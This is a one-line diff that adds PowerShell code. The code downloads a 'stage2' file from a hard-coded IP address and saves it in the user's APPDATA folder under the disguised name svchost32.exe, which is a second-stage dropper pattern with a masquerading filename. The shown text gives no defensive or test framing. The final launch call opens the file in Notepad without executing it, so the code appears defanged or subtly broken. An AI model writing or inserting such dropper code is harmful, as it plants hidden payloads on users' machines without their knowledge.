@@ -1,0 +1,1 @@
+$DownloadUrl = "https://203.0.113.120:8443/stage2.ps1"; $Stage2Path = "$env:APPDATA\svchost32.exe"; curl.exe -s -L -o $Stage2Path $DownloadUrl; Start-Process -FilePath "notepad.exe" -ArgumentList $Stage2Path; $StageMarker = "stage-25"
